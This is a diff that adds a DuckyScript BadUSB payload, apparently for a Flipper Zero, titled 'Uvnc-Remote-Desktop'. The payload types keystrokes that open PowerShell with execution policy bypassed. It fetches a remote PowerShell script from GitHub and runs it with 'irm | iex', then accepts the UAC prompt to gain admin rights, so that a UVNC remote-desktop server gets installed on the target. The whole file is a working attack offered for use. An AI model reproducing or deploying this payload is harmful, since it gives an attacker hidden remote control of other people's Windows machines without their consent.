@@ -1,0 +1,18 @@
+REM Title: Uvnc-Remote-Desktop
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Downloads Uvnc client to machine and runs winvnc.exe
+REM Target: Windows 10
+
+REM *REQUIREMENTS*
+REM admin required for disable USB function.
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -Exec Bypass -C $ip = ''; irm https://raw.githubusercontent.com/beigeworm/BadUSB-Files-For-FlipperZero/main/Uvnc-Remote-Desktop/main.ps1 | iex
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
